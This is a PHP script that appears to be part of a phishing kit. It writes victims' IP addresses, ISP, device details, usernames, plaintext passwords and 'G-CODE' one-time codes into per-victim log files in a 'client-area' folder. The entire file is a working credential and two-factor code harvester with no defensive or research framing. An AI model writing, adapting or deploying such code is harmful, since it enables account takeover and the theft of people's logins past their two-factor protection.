<?php
$logs_file = fopen('../client-area/logs/'.$_SESSION['username'].'.txt', 'a');

if ($logs_file) {

    switch ($step) {
        case 1:
            fwrite($logs_file, "IP: ".$_SESSION['user_data']['query']."\r\n");
            fwrite($logs_file, "COUNTRY: ".$_SESSION['user_data']['countryCode']."\r\n");
            fwrite($logs_file, "ISP: ".$_SESSION['user_data']['isp']."\r\n");
            fwrite($logs_file, "ORG: ".$_SESSION['user_data']['org']."\r\n");
            fwrite($logs_file, "ASN: ".$_SESSION['user_data']['as']."\r\n");
            fwrite($logs_file, "DEVICE: ".$_SESSION['device']."\r\n");
            fwrite($logs_file, "BROWSER: ".$_SESSION['browser']."\r\n");
            fwrite($logs_file, "OS: ".$_SESSION['os']."\r\n");
            fwrite($logs_file, "USER AGENT: ".$_SERVER['HTTP_USER_AGENT']."\r\n \r\n");
            fwrite($logs_file, "USERNAME[".$_SESSION['login_counter']."]: ".$_SESSION['username']."\r\n \r\n");
            break;
        case 2:
            fwrite($logs_file, "PASSWORD[".$_SESSION['pwd_counter']."]: ".$_SESSION['password']."\r\n \r\n");
            break;
        case 3:
            fwrite($logs_file, "G-CODE[".$_SESSION['otp_counter']."]: ".$_SESSION['otp']."\r\n \r\n");
            break;
        default:

            break;
    }

    fclose($logs_file);
} else {
    die('{"error": true, "description": "cannot write to file", "action": "contact developer"}');
}
?>